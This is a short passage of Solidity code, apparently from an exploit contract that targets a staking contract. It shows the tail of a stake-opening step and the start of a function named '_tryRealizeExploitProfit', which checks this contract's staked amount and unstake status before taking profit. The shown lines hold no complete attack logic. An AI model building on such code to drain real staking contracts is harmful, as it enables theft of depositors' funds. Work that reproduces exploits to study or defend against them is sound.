            stakeOpened = true;
        } catch {}
    }

    function _tryRealizeExploitProfit() internal {
        (
            uint256 stakedAmount,
            ,
            uint256 endTime,
            ,
            ,
            uint256 unstakeStatus
        ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);

        if (stakedAmount == 0 || unstakeStatus != 0) {
            return;
